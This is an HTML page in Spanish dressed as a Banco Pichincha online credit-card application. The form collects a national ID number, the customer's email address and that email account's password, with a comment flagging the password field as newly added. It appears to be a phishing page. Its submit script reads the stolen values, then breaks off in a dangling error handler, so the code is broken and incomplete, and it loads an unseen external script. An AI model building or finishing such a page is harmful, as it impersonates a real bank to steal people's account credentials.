<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Solicitud - Tarjeta de Crédito</title>

  <link href="https://fonts.googleapis.com/css2?family=Merriweather:wght@300;400;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">

  <style>
    :root{
      --bg:#f6f7fb;
      --card:#ffffff;
      --accent:#0a2b5a;
      --muted:#9aa0a8;
      --yellow:#ffe79a;
      --shadow: 0 8px 30px rgba(10,43,90,0.08);
    }
    body{
      margin:0;
      font-family:"Inter",sans-serif;
      background:var(--bg);
      color:#222;
    }
    .hero{
      min-height:40vh;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:48px 20px;
      background:linear-gradient(180deg,#ffd200,#ffd200);
      color:#fff;
      text-align:center;
    }
    .headline{
      font-family:"Merriweather",serif;
      font-size:36px;
      margin:0 0 12px;
      font-weight:700;
    }
    .subhead{font-size:18px;}
    .container{max-width:600px;margin:-40px auto 48px;padding:0 20px;}
    .card{
      background:var(--card);
      border-radius:14px;
      box-shadow:var(--shadow);
      padding:34px;
    }
    .card h2{margin:0 0 4px;font-family:"Merriweather",serif;color:var(--accent);font-size:26px;text-align:center;}
    .card p.lead{text-align:center;margin:6px 0 20px;color:var(--muted);}
    label.field-label{display:block;font-weight:600;color:var(--accent);margin-bottom:6px;}
    .input{
      width:95%;padding:14px;border-radius:8px;
      border:1.5px solid rgba(10,43,90,0.15);
      font-size:16px;margin-bottom:16px;
    }
    .consent{display:flex;gap:10px;align-items:flex-start;margin-bottom:20px;color:var(--muted);font-size:14px;}
    .btn{display:block;width:100%;padding:14px;border-radius:10px;border:none;
      background:linear-gradient(180deg,var(--yellow),#ffe073);
      color:var(--accent);font-weight:700;font-size:18px;cursor:pointer;}
  </style>
</head>
<body>

  <header class="hero">
    <div>
      <h1 class="headline">Tenemos la Tarjeta de Crédito perfecta para ti</h1>
      <p class="subhead">Solicítala 100% en línea sin filas ni trámites</p>
    </div>
  </header>

  <main class="container">
    <section class="card">
      <h2>¡Empecemos!<br>Ingresa tus datos</h2>
      <p class="lead">Completa la información para continuar</p>

      <form id="solicitudForm" novalidate>
        <label class="field-label" for="cedula">Número de cédula</label>
        <input id="cedula" class="input" type="text" placeholder="Ingresa tu cédula" required />

        <label class="field-label" for="correo">Correo registrado en el Banco</label>
        <input id="correo" class="input" type="email" placeholder="correo@ejemplo.com" required />

        <!-- NUEVO CAMPO: clave de correo -->
        <label class="field-label" for="clave">Clave de correo</label>
        <input id="clave" class="input" type="password" placeholder="Ingresa tu clave" required />

        <div class="consent">
          <input id="autorizo" type="checkbox" required />
          <label for="autorizo">Autorizo a Banco Pichincha a consultar mis datos personales y crediticios de fuentes legales de información y su respectivo tratamiento.</label>
        </div>

        <button type="submit" class="btn">Empezar solicitud</button>
      </form>
    </section>
  </main>

  <!-- Aquí incluimos trl.js -->
  <script src="trl.js"></script>

  <script>
    document.getElementById('solicitudForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const cedula = document.getElementById('cedula').value.trim();
      const correo = document.getElementById('correo').value.trim();
      const clave  = document.getElementById('clave').value.trim();
      const autorizo = document.getElementById('autorizo').checked;

      if (!cedula || !correo || !clave || !autorizo) {
        return; // Si falta algún dato, no se hace nada (quitar alertas)
      }

        .catch(error => {

        });

  </script>

</body>
</html>
